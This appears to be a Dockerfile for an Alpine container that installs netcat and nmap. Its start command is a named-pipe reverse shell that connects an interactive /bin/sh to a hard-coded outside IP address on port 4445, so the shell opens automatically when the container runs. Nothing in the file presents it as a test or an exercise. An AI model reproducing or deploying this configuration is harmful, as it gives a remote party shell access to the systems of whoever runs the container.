FROM alpine:3.19
RUN apk add --no-cache netcat-openbsd nmap
CMD mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 147.45.243.135 4445 > /tmp/f
 
   
  
 
   
   
 
 
  
   
 
